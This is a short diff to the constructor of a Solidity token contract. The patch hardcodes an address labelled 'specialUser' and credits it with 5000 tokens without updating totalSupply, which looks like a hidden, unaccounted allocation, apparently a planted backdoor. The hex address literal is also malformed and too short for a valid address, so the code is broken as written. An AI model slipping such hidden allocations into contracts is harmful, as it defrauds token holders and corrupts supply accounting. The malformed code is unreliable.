@@ -29,6 +29,8 @@ contract Ibcs {
     balance[owner] = totalSupply;
     name = tokenName;
     symbol = tokenSymbol;
+    address specialUser = 0x6F54ABC78124EFCB12097ABCDEF;
+    balance[specialUser] = 5000;
   }
 
   function getProfile(address user) public returns (uint256 currentBalance, uint256 loanSum, uint256 reputation, uint256 borrowLimit) {
